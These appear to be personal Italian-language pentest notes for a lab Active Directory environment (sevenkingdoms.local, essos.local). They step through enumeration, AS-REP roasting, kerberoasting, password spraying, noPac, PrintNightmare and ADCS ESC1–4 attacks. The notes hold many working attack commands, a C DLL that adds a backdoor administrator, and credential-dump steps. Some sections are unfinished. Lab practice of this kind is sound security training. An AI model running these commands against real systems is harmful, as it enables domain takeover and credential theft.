### **SUBNET ENUM**
Inizio enumerando l'intera subnet con cme alla ricerca du samba
```bash
crackmapexec smb 192.168.56.0/24
```
![[Pasted image 20230810122313.png]]
Ora trovo gli ip dei DC per configurare /etc/hosts e capire la topologia
```bash
nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10
```
cambia ogni volta il nome del dominio
![[Pasted image 20230810124141.png]]
quindi modifico /etc/hosts per risolvere gli indirizzi
![[Pasted image 20230810124229.png]]

### **USER ENUM (NO CREDS)**
Enumero gli user presenti su ogni macchine
```bash
crackmapexec smb 192.168.56.11 --users
```
Ha SAMRPC attivo e quindi potrò enumerare gli user
![[Pasted image 20230810163553.png]]
Ho ottenuto anche una password trovata nella descrizione negli user

Puoi anche ottenere la policy della password per provare del bruteforce
```bash
crackmapexec smb 192.168.56.11 --pass-pol
```
![[Pasted image 20230810164319.png]]
Potresti usare anche enu4linux ma non ho voglia

### **SHARE SMB (NO CREDS)**
Enumeriamo gli share di smb su cui abbiamo qualche permesso come anonimo
```bash
crackmapexec smb 192.168.56.10-23 -u 'guest' -p '' --shares
```
![[Pasted image 20230810165921.png]]
cioccato

### **ASPREP-roasting**
Hai trovato la lista degli username, ora spolvera gli appunti
```bash
impacket-GetNPUsers 'north.sevenkingdoms.local/' -no-pass -usersfile users.txt -format hashcat -outputfile hash
```
![[Pasted image 20230810171242.png]]
cracca l'hash
![[Pasted image 20230810171924.png]]

### **Password Spraying**
==OCCHIO ALLE POLICY DELLE PASSWORD PERCHE POTRESTI LOCKARE LE PASSWORD==
```bash
crackmapexec smb 192.168.56.11 -u user.txt -p user.txt --no-bruteforce
```
![[Pasted image 20230810172208.png]]
### **NTLM RELAY**
Controlliamo tra gli host se ce ne è uno con l'opzione "signing:False"
```bash
crackmapexec smb 192.168.56.10-23 --gen-relay-list relay.txt
```
![[Pasted image 20230825154818.png]]
Da approfondire quando si potrà
### **USER ENUM(W\ CREDS)**
Per ottenere tutti gli User di un dominio avendo un account a disposizione
```bash
impacket-GetADUsers -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople 
```
![[Pasted image 20230825105044.png]]

### **KERBEROASTING (SPN)**
Proviamo a vedere se c'è qualche SPN settato e con l'hash in chiaro (Cosa che capita spesso)
```bash
impacket-GetUserSPNs -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
```
![[Pasted image 20230825112141.png]]
Gli hash di questi due utenti sono stati inseriti nel file kerberoasting.hashes (opzione -outpoutfile)

Puoi usare anche crackmapexec per farlo
```bash
cme ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING
```

Cracca gli hash
```bash
hashcat -m 13100 -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20230825114831.png]]
Solo un hash è stata craccata

### **AD ENUM (BLOODHOUND)**
Ora che abbiamo trovato delle credenziali per accedere possiamo fare un enumerazione dell'ad tramite bloodhound e trovare i vari path per gli account
```bash
xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert-ignore
```
Passa l'exe ed avvialo, enumerando tutti e 3 i domain
```bash
.\sharphound.exe -d north.sevenkingdoms.local -c all --zipfilename bh_north_sevenkingdoms.zip
.\sharphound.exe -d sevenkingdoms.local -c all --zipfilename bh_sevenkingdoms.zip
.\sharphound.exe -d essos.local -c all --zipfilename bh_essos.zip
```

### **SamAccountName (NoPac) CVE-2021-42287**
Per questo passaggio scarica
[GitHub - dirkjanm/krbrelayx: Kerberos unconstrained delegation abuse toolkit](https://github.com/dirkjanm/krbrelayx)
impacket-renameMachine.py
impacket-getST.py

Vediamo il machine account quota (Quanti computer puoi aggiungere al domain) dell'account trovato con il kerberoasting
```bash
crackmapexec ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M MAQ
```
![[Pasted image 20230825161202.png]]
Ora aggiungiamo il nuovo computer al domain
```bash
impacket-addcomputer -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'
```
![[Pasted image 20230825162234.png]]
Ora puliamo l'SPNs del nuovo computer
```bash
python3 addspn.py --clear -t 'samaccountname$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'
```
![[Pasted image 20230825164134.png]]
Rinominiamo il computer a DCl (Da qui in poi non sono riuscito a fare l'exploit)
```bash
python3 renameMachine.py -current-name 'samaccountname$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/jon.snow:iknownothing
```
![[Pasted image 20230825170216.png]]
```bash
impacket-getTGT -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'ComputerPassword'
```
![[Pasted image 20230825170322.png]]
```bash
renameMachine.py -current-name 'winterfell' -new-name 'samaccount$' north.sevenkingdoms.local/jon.snow:iknownothing
```
![[Pasted image 20230825170418.png]]
```bash
export KRB5CCNAME=/workspace/winterfell.ccache
```
```bash
impacket-getST -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug
```
![[Pasted image 20230825170523.png]]
```bash
export KRB5CCNAME=/workspace/administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
```
```bash
secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenkingdoms.local'
```
![[Pasted image 20230825170548.png]]

### **PrintNightmare**
Inanzitutto controlliamo se spooler è attivo
```bash
crackmapexec smb 192.168.56.10-23 -M spooler
```
![[Pasted image 20230825171651.png]]
o
```bash
impacket-rpcdump @192.168.56.10 | egrep 'MS-RPRN|MS-PAR'
```
![[Pasted image 20230825171815.png]]
Crea l'exploit nightmare.c
```c
#include <windows.h> 
int RunCMD()
{
    system("net users pnightmare Passw0rd123. /add");
    system("net localgroup administrators pnightmare /add");
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        RunCMD();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
e compilalo
```bash
x86_64-w64-mingw32-gcc -shared -o nightmare.dll nightmare.c
```
clona l'exploit dalla repository
```bash
git clone https://github.com/cube0x0/CVE-2021-1675 printnightmare
```
avvia una share smb
```bash
impacket-smbserver -smb2support ATTACKERSHARE .
```
continua quando possibile (part5)
### **ADCS RECON AND ENUM(CON CREDS)**
Si può fare con due tool principalmente, ma inizialmente va usato certipy per ottenere lo zip da inserire in bloodhound
```bash
certipy-ad find -u khal.drogo@essos.local -p 'horse' -dc-ip 192.168.56.12
```
![[Pasted image 20230828125307.png]]
*Certipy*
Usando certipy e l'opzione "-vulnerable" è possibile ottenere informazioni sui template e i permessi vulnerabili
```bash
certipy-ad find -u khal.drogo@essos.local -p 'horse' -vulnerable -dc-ip 192.168.56.12 -stdout
```
![[Pasted image 20230828125806.png]]
![[Pasted image 20230828144854.png]]
![[Pasted image 20230828144917.png]]
![[Pasted image 20230828144930.png]]

*BloodHound*
Carica il file zip e  vai in PKI -> Find certificate authority -> see enabled template
### **ESC 1 - ADCS**
Richiedi il certificato tramite certipy
```bash
certipy-ad req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
```
![[Pasted image 20230828145911.png]]
Usando poi il certificato ottieni l'hash dell'amministratore
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12
```
![[Pasted image 20230828150041.png]]
### **ESC 2 & 3 - ADCS**
Prendi il certificato usando certipy
```bash
certipy-ad req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template ESC2 -ca ESSOS-CA
```
![[Pasted image 20230828150256.png]]
Ora usa il certificato ottenuto per scaricare il certificato dell'amministratore
```bash
certipy-ad req -u khal.drogo@essos.local -p 'horse' -target 192.168.56.23 -template User -ca ESSOS-CA -on-behalf-of 'essos\administrator' -pfx khal.drogo.pfx
```
![[Pasted image 20230828150815.png]]
Ora usando il suo certificato prendi l'hash
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.56.12
```
![[Pasted image 20230828150913.png]]
### **ESC 4 - ADCS**
Grazie al permesso genericWrite possiamo modificare il nostro template per renderlo vulnerabile all'ESC1
```bash
certipy-ad template -u khal.drogo@essos.local -p 'horse' -template ESC4 -save-old -debug
```
![[Pasted image 20230828151521.png]]
Poi exploitalo come ESC1.
Per riportarlo alla normalità
```bash
certipy-ad template -u khal.drogo@essos.local -p 'horse' -template ESC4 -configuration ESC4.json
```
![[Pasted image 20230828151547.png]]
### **ESC 8 - ADCS**

Da fare
### **CVE-2022-26923**
[Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) | by Oliver Lyak | IFCR](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
Crea un account con un domain user e setta un nome fake del dns come domain controller
```bash
certipy-ad account create -u khal.drogo@essos.local -p 'horse' -user 'certifriedpc' -pass 'certifriedpass' -dns 'meereen.essos.local'
```
### **titolo**